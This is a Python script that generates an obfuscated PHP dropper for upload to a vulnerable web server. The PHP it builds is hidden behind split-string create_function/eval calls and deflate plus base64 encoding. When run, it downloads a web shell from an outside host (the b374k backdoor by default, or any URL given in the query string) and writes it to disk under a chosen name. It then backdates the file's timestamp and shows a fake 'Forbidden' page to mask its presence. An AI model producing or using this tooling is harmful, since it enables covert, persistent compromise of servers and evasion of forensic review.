import zlib, base64


# Top portion of the PHP output already obfuscated
data1 = '''<?php\n$func="cr"."eat"."e_fun"."cti"."on";$obfus=$func('$x','ev'.'al'.'("?>".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'.'co'.'de($x)));');$obfus("'''

# The following code will download a backdoor and save it as obfuscated.php and send touch 
# command to set 01-Oct-2021 11:05:57 if no args are passed when the PHP page is accessed
# Example of args that can be passed:
# http://vulnerable.site/uploads/obfuscated.php?path=../&url=https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php&fname=innocent.php
data2_raw = """<?php
$gpath = $_GET['path'];
$url1 = $_GET['url'];
$fname1 = $_GET['fname'];
if (!isset($gpath)){
    $path = './';
}
else{
    $path = $gpath;
}
if (!isset($fname1)){
    $fname = 'obfuscated.php';
}
else{
    $fname = $fname1;
}
if (!isset($url1)){
    $url = 'https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/b374k.php';
}
else{
    $url = $url1;
}
$fpath = $path . $fname;
$file_data = file_get_contents($url);
file_put_contents($fpath, $file_data);
touch($fpath, strtotime("01-Oct-2021 11:05:57"));
echo("<h1>Forbidden!</h1><br><br>You don't have permission to access this directory on this server.");
?>"""

# Closing the PHP code
data3 = '");?>'

# Deflate and b64 encoding
data2_deflate = zlib.compress(data2_raw.encode('utf-8'), compresslevel=-1, wbits=-15)
data2 = base64.b64encode(data2_deflate).decode('utf-8')

# Concatenate all
full_data = data1 + data2 + data3

# Output PHP payload to be send to the server
with open("out.php", "w") as o:
    o.write(full_data)
